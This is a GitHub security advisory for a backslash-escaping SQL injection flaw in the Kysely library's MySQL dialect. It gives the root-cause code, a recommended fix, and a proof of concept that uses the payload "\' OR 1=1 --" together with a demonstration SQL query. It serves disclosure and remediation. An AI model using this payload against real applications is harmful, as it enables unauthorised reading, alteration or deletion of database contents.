# [H] Kysely has a MySQL SQL Injection via Insufficient Backslash Escaping in `sql.lit(string)` usage or similar methods that append string literal values into the compiled SQL strings

## Summary
Severity: High
Advisory: GHSA-8cpq-38p9-67gx
CVE: CVE-2026-33468
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-8cpq-38p9-67gx
Type: github-advisory

## Affected
- npm: `kysely` — affected >=0 <0.28.14

## Details
## Summary

Kysely's `DefaultQueryCompiler.sanitizeStringLiteral()` only escapes single quotes by doubling them (`'` → `''`) but does not escape backslashes. When used with the MySQL dialect (where `NO_BACKSLASH_ESCAPES` is OFF by default), an attacker can use a backslash to escape the trailing quote of a string literal, breaking out of the string context and injecting arbitrary SQL. This affects any code path that uses `ImmediateValueTransformer` to inline values — specifically `CreateIndexBuilder.where()` and `CreateViewBuilder.as()`.

## Details

The root cause is in `DefaultQueryCompiler.sanitizeStringLiteral()`:

**`src/query-compiler/default-query-compiler.ts:1819-1821`**
```typescript
protected sanitizeStringLiteral(value: string): string {
  return value.replace(LIT_WRAP_REGEX, "''")
}
```

Where `LIT_WRAP_REGEX` is defined as `/'/g` (line 121). This only doubles single quotes — it does not escape backslash characters.

The function is called from `appendStringLiteral()` which wraps the sanitized value in single quotes:

**`src/query-compiler/default-query-compiler.ts:1841-1845`**
```typescript
protected appendStringLiteral(value: string): void {
  this.append("'")
  this.append(this.sanitizeStringLiteral(value))
  this.append("'")
}
```

This is reached when `visitValue()` encounters an immediate value node (line 525-527), which is created by `ImmediateValueTransformer` used in `CreateIndexBuilder.where()`:

**`src/schema/create-index-builder.ts:266-278`**
```typescript
where(...args: any[]): any {
  const transformer = new ImmediateValueTransformer()

  return new CreateIndexBuilder({
    ...this.#props,
    node: QueryNode.cloneWithWhere(
      this.#props.node,
      transformer.transformNode(
        parseValueBinaryOperationOrExpression(args),
        this.#props.queryId,
      ),
    ),
  })
}
```

The `MysqlQueryCompiler` (at `src/dialect/mysql/mysql-query-compiler.ts:6-75`) extends `DefaultQueryCompiler` but does **not** override `sanitizeStringLiteral`, inheriting the backslash-unaware implementation.

**Exploitation mechanism:**

In MySQL with the default `NO_BACKSLASH_ESCAPES=OFF` setting, the backslash character (`\`) acts as an escape character inside string literals. Given input `\' OR 1=1 --`:

1. `sanitizeStringLiteral` doubles the quote: `\'' OR 1=1 --`
2. `appendStringLiteral` wraps: `'\'' OR 1=1 --'`
3. MySQL interprets `\'` as an escaped (literal) single quote, so the string content is `'` and the second `'` closes the string
4. ` OR 1=1 --` is parsed as SQL

## PoC

```typescript
import { Kysely, MysqlDialect } from 'kysely'
import { createPool } from 'mysql2'

interface Database {
  orders: {
    id: number
    status: string
    order_nr: string
  }
}

const db = new Kysely<Database>({
  dialect: new MysqlDialect({
    pool: createPool({
      host: 'localhost',
      database: 'test',
      user: 'root',
      password: 'password',
    }),
  }),
})

// Simulates user-controlled input reaching CreateIndexBuilder.where()
const userInput = "\\' OR 1=1 --"

const query = db.schema
  .createIndex('orders_status_index')
  .on('orders')
  .column('status')
  .where('status', '=', userInput)

// Compile to see the generated SQL
const compiled = query.compile()
console.log(compiled.sql)
// Output: create index `orders_status_index` on `orders` (`status`) where `status` = '\'' OR 1=1 --'
//
// MySQL parses this as:
//   WHERE `status` = '\'   ← string literal containing a single quote
//   ' OR 1=1 --'          ← injected SQL (OR 1=1), comment eats trailing quote
```

To verify against a live MySQL instance:

```sql
-- Setup
CREATE DATABASE test;
USE test;
CREATE TABLE orders (id INT PRIMARY KEY, status VARCHAR(50), order_nr VARCHAR(50));
INSERT INTO orders VALUES (1, 'active', '001'), (2, 'cancelled', '002');

-- The compiled query from Kysely with injected payload:
-- This returns all rows instead of filtering by status
SELECT * FROM orders WHERE status = '\'' OR 1=1 -- ';
```

## Impact

- **SQL Injection:** An attacker who controls values passed to `CreateIndexBuilder.where()` or `CreateViewBuilder.as()` can inject arbitrary SQL statements when the application uses the MySQL dialect.
- **Data Exfiltration:** Injected SQL can read arbitrary data from the database using UNION-based or subquery-based techniques.
- **Data Modification/Destruction:** Stacked queries or subqueries can modify or delete data.
- **Authentication Bypass:** If index creation or view definitions are influenced by user input in application logic, the injection can alter query semantics to bypass access controls.

The attack complexity is rated High (AC:H) because exploitation requires an application to pass untrusted user input into DDL schema builder methods, which is an atypical but not impossible usage pattern. The `CreateIndexBuilder.where()` docstring (line 247) notes "Parameters are always sent as literals due to database restrictions" without warning about the security implications.

## Recommended Fix

`MysqlQueryCompiler` should override `sanitizeStringLiteral` to escape backslashes before doubling quotes:

**`src/dialect/mysql/mysql-query-compiler.ts`**
```typescript
const LIT_WRAP_REGEX = /'/g
const BACKSLASH_REGEX = /\\/g

export class MysqlQueryCompiler extends DefaultQueryCompiler {
  // ... existing overrides ...

  protected override sanitizeStringLiteral(value: string): string {
    // Escape backslashes first (\ → \\), then double single quotes (' → '')
    // MySQL treats backslash as an escape character by default (NO_BACKSLASH_ESCAPES=OFF)
    return value.replace(BACKSLASH_REGEX, '\\\\').replace(LIT_WRAP_REGEX, "''")
  }
}
```

Alternatively, the library could use parameterized queries for these DDL builders where the database supports it, avoiding string literal interpolation entirely. For databases that don't support parameters in DDL statements, the dialect-specific compiler must escape all characters that have special meaning in that dialect's string literal syntax.

## References
- https://github.com/kysely-org/kysely/security/advisories/GHSA-8cpq-38p9-67gx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33468
- https://github.com/kysely-org/kysely
